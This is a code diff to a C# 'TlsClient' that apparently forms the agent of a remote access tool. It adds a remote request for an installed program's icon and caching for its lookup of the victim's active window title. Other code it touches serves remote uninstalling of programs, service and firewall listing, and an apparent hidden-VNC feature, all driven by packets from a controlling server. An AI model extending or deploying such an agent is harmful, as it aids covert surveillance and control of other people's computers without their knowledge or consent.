@@ -675,6 +675,17 @@ internal class TlsClient : IDisposable
                     if (appUninstall != null) InstalledAppsFeature.Uninstall(appUninstall.UninstallString);
                     break;
 
+                case PacketType.InstalledGetIcon:
+                {
+                    var iconReq = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.InstalledIconRequestStub);
+                    if (iconReq != null)
+                    {
+                        var icoB64 = InstalledAppsFeature.GetIcon(iconReq.Name);
+                        _ = Task.Run(async () => await WritePacketAsync(new Packet { Type = PacketType.InstalledIconResult, Data = JsonSerializer.Serialize(new InstalledIconResultStub { Name = iconReq.Name, IconB64 = icoB64 }, SeroJson.Default.InstalledIconResultStub) }, CancellationToken.None));
+                    }
+                    break;
+                }
+
                 // ── Service Manager ──────────────────────────────────
                 case PacketType.SvcGetList:
                     _ = Task.Run(async () => await WritePacketAsync(new Packet { Type = PacketType.SvcListResult, Data = ServiceManagerFeature.GetList() }, CancellationToken.None));
@@ -905,17 +916,26 @@ internal class TlsClient : IDisposable
     [System.Runtime.InteropServices.DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
     private static extern int GetWindowTextW(nint hwnd, System.Text.StringBuilder sb, int max);
 
+    private static string _lastActiveTitle = "";
+    private static nint _lastActiveHwnd = 0;
+    private static int _activeSkipCounter;
+
     private static string GetActiveWindowTitle()
     {
+        if (++_activeSkipCounter % 3 != 0)
+            return _lastActiveTitle;
         try
         {
             var hwnd = GetForegroundWindow();
-            if (hwnd == 0) return "";
+            if (hwnd == 0) return _lastActiveTitle = "";
+            if (hwnd == _lastActiveHwnd && _lastActiveTitle.Length > 0)
+                return _lastActiveTitle;
+            _lastActiveHwnd = hwnd;
             var sb = new System.Text.StringBuilder(256);
             GetWindowTextW(hwnd, sb, 256);
-            return sb.ToString();
+            return _lastActiveTitle = sb.ToString();
         }
-        catch { return ""; }
+        catch { return _lastActiveTitle = ""; }
     }
 
     // ── CPU/RAM sampling ────────────────────────────────
@@ -1961,6 +1981,8 @@ internal enum PacketType
     InstalledGetList    = 230,
     InstalledListResult = 231,
     InstalledUninstall  = 232,
+    InstalledGetIcon    = 233,
+    InstalledIconResult = 234,
 
     SvcGetList    = 240,
     SvcListResult = 241,
@@ -2212,6 +2234,8 @@ internal class HvncProgressDataStub
 [JsonSerializable(typeof(InstalledAppStub))]
 [JsonSerializable(typeof(InstalledListResultStub))]
 [JsonSerializable(typeof(InstalledUninstallStub))]
+[JsonSerializable(typeof(InstalledIconRequestStub))]
+[JsonSerializable(typeof(InstalledIconResultStub))]
 [JsonSerializable(typeof(List<InstalledAppStub>))]
 // Service Manager
 [JsonSerializable(typeof(ServiceEntryStub))]
@@ -2264,6 +2288,8 @@ internal class TcpFirewallRulesResultStub { public List<TcpFirewallRuleStub> Rul
 internal class InstalledAppStub       { public string Name { get; set; } = ""; public string Version { get; set; } = ""; public string Publisher { get; set; } = ""; public string InstallDate { get; set; } = ""; public string UninstallString { get; set; } = ""; public string IconB64 { get; set; } = ""; }
 internal class InstalledListResultStub{ public List<InstalledAppStub> Apps { get; set; } = []; }
 internal class InstalledUninstallStub { public string UninstallString { get; set; } = ""; }
+internal class InstalledIconRequestStub { public string Name { get; set; } = ""; }
+internal class InstalledIconResultStub  { public string Name { get; set; } = ""; public string IconB64 { get; set; } = ""; }
 
 // ── Service Manager ───────────────────────────────────
 internal class ServiceEntryStub   { public string Name { get; set; } = ""; public string DisplayName { get; set; } = ""; public string Status { get; set; } = ""; public string StartType { get; set; } = ""; public string Description { get; set; } = ""; public string LogOnAs { get; set; } = ""; }
